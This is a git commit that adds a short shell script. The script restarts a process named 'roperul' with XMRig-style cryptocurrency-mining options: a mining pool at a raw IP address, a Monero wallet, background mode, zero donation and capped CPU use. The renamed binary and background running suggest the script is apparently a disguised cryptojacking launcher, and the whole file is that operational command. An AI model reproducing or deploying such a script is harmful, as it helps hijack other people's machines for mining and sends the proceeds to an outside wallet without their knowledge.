ef928427a9c66d3ebf9e8e66062bf12b2038dc7f
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-08 14:26:22 +0200

    Add files via upload

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill roperul
+sleep 7
+roperul -o 94.130.179.118:3232 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=12:koot@usa.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=80 --av=1 --variant -1
